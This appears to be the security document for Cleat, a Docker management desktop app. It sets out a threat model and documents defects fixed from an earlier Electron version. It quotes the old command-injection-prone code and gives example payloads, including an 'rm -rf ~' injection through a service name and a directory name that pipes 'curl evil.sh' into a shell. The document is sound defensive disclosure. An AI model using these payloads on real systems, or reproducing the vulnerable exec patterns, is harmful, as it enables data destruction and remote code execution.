# Security

## Threat model

A container-management GUI is a privileged tool. Access to the Docker socket is
**root-equivalent on the host** — anyone who can reach it can start a container
that bind-mounts `/` and read or write anything. So the two questions that matter
are:

1. **Who can reach the daemon through us?** Only the local user, through the app
   window. There is no network surface.
2. **Can user-supplied text become a command?** No. Every subprocess is argv, and
   the two fields that reach a subprocess are validated first.

Everything below follows from those two.

## Defects fixed in the port

These were present in the discontinued Electron implementation (`backend/app.js`
in the [previous repository](https://github.com/rajeshpillai/docker-desktop-lite)) and are the reason the rewrite was
worth doing. They are documented here so they are not reintroduced.

### 1. Root-equivalent Docker control exposed to the network

```js
app.use(cors());                                    // any origin
app.listen(3000);                                   // all interfaces
```

An Express server bound to `0.0.0.0:3000` with permissive CORS, in front of a
full `dockerode` client. Anything on the LAN — or any web page the user visited,
via CORS — could list, start, stop, and delete containers, and create new ones
with arbitrary mounts.

**Now:** there is no HTTP server. Commands are Tauri IPC between the WebView and
the Rust process in the same application. No port is bound, no origin is
accepted, and there is nothing to misconfigure.

### 2. Command injection via service name

```js
exec(`docker exec ${containerId} systemctl start ${serviceName}`, ...)
```

`serviceName` came straight from the URL path. A request for
`/containers/abc/services/nginx;%20rm%20-rf%20~/start` executed `rm -rf ~` as the
user running the backend.

**Now:** [`engine.rs::exec_capture()`](../tauri-rs/src-tauri/src/runtime/engine.rs)
uses bollard's `create_exec` with an **argv vector**. There is no shell in the
path at all, so metacharacters are inert. On top of that:

- the action is whitelisted (`start` | `stop` | `restart` | `status`)
- the unit name must match `[A-Za-z0-9.\-_@:\\]{1,128}` and may not begin with
  `-` (which would otherwise be parsed as a flag)

`rejects_shell_metacharacters_in_service_names` asserts eight payloads are
rejected — `;`, `&&`, `|`, `$(…)`, backticks, newline, `>`, and a leading `-`.

### 3. Command injection via compose project directory

```js
const composeFilePath = path.resolve(projectDir, 'docker-compose.yml');
exec(`docker-compose -f ${composeFilePath} up -d`, { cwd: projectDir }, ...)
```

`projectDir` came from the request body. `path.resolve` normalises a path; it does
not escape shell metacharacters. A directory named `/tmp/x; curl evil.sh | sh`
executed.

**Now:** [`compose.rs`](../tauri-rs/src-tauri/src/runtime/compose.rs) builds argv
and passes it to `tokio::process::Command`, never a shell string. The directory is
canonicalised and confirmed to be a directory before use, so a bad path fails
cleanly instead of running the command somewhere unexpected.

### 4. A route that could never work

`GET /containers/:id/services` called `fetchContainerServices()`, which was never
defined anywhere in the codebase. The route always threw and returned 500.

**Now:** implemented via `systemctl list-units --type=service --no-pager --plain
--no-legend`, parsed by `parse_systemctl_units()`, with unit tests covering the
normal output, the bullet-prefixed degraded-unit form, and non-service noise.

### 5. Every error was a 500

`res.status(500)` regardless of what the daemon said, so the UI could not
distinguish "no such container" from "daemon unreachable" from "network still in
use".

**Now:** typed error kinds — see [architecture.md](architecture.md#error-mapping).

## Rules for contributors

These are the invariants that keep the above fixed.

**Never build a shell string.** Use argv:

```rust
// NO
Command::new("sh").arg("-c").arg(format!("docker exec {id} systemctl start {svc}"))

// YES
Command::new(program).args(leading).args(args).current_dir(dir)
// or, better, no subprocess at all:
docker.create_exec(id, CreateExecOptions { cmd: Some(argv), .. })
```

**Compose is the only subprocess.** It has no API — it is a CLI tool — so it is
the one legitimate exception. Everything else goes through the Engine API. If you
find yourself reaching for `Command` elsewhere, check whether bollard already
exposes it.

**Validate anything that reaches argv.** Even without a shell, an unvalidated
value can become a *flag*. `--force` as a "service name" is not a shell injection
but is still a command the user didn't ask for. Hence the leading-`-` rejection in
`validate_service_name()`.

**Whitelist verbs, don't blacklist characters.** The action parameter is matched
against a fixed set. Adding a new one is a deliberate edit.

**The interactive terminal is a deliberate exception, and it is not a
regression.** [`exec_start()`](../tauri-rs/src-tauri/src/runtime/engine.rs) takes
an unconstrained argv, which looks like it contradicts the rule above. It does
not, and the distinction is worth being explicit about:

- The service-control path takes a value that names *one* thing (a systemd unit)
  and would otherwise be interpolated into a command the user never asked for.
  Constraining it removes capability the feature never needed.
- The terminal's whole purpose is to run a command of the user's choosing. There
  is no smaller capability that still delivers the feature.

What keeps it sound is that the mechanism is unchanged: `create_exec` receives an
**argv vector**, never a shell string, so there is no metacharacter parsing to
subvert — if the user types `;` it reaches the shell *inside the container*,
which is exactly what a terminal is for. The trust boundary is the container, and
the user already holds root-equivalent daemon control through this app; a
terminal grants nothing they could not obtain via `create_container`.

Empty and whitespace-only argv are still rejected (`rejects_empty_exec`), because
those are bugs rather than intentions.

Two consequences worth knowing:

- **Terminal traffic is base64 over IPC**, not text. This is a correctness
  measure, not a security one — a `String` would force a lossy UTF-8 decode that
  corrupts escape sequences and multi-byte characters split across chunks.
- **Closing a terminal aborts the connection**, which is how the Docker CLI
  behaves too. A process that ignores its terminal closing can survive as an
  orphan inside the container until it exits or the container stops.

**Canonicalise paths before use.** `resolve_project_dir()` calls `canonicalize()`
and checks `is_dir()`.

**Don't widen the capability set casually.**
[`capabilities/default.json`](../tauri-rs/src-tauri/capabilities/default.json)
grants `core:default`, `opener:default`, and `dialog:allow-open` — the last only
so the compose view can open a directory picker. The CSP in
[`tauri.conf.json`](../tauri-rs/src-tauri/tauri.conf.json) restricts the WebView
to `'self'` plus the IPC origin; there is no remote content and no reason for
there to be.

## Showing what Cleat actually does

The **Activity** view records every operation, with arguments, timing and
outcome. It exists because of the first item under *What is not claimed* below:
Cleat has root-equivalent access to the daemon, and a document asserting it
makes only the calls it says it does is weaker than showing them.

Two design points worth keeping:

- **It records Engine API requests, not `docker` commands.** Cleat speaks the
  API; there is no CLI invocation behind `start_container` to reveal. Printing
  `docker start abc` would be showing a *translation* while implying it was a
  *recording* — and the moment the two diverge, the panel is confidently wrong.
  Compose is the exception and shows the literal argv, because compose is the
  one remaining subprocess.
- **The recorder is a decorator on `ContainerRuntime`**
  ([`runtime/audit.rs`](../tauri-rs/src-tauri/src/runtime/audit.rs)), wrapped on
  in `AppState::select_runtime` — the only place a runtime is constructed.
  Logging per command handler would drift the first time someone adds a command
  and forgets the logging line, and a log that silently under-reports is worse
  than none.

Environment values whose keys look secret (`password`, `token`, `secret`,
`*_key`, …) are masked before they reach the log, since the whole point is that
people paste this into bug reports. `masks_secret_looking_env_values` and
`leaves_ordinary_env_alone` pin both directions.

The buffer holds the most recent 500 entries in memory and is never written to
disk.

## What is *not* claimed

- **We do not sandbox the daemon.** If your user can reach the Docker socket, so
  can this app, by design. It is a management tool.
- **Container images are not scanned.** Vulnerability scanning (Trivy/Grype) is
  on the roadmap, not implemented.
- **Registry credentials are not managed.** Pulls use the daemon's existing auth;
  we pass `None` for credentials and never read `~/.docker/config.json`.
- **No formal audit** has been performed. The claims above describe specific
  defects fixed and specific tests that pin them.
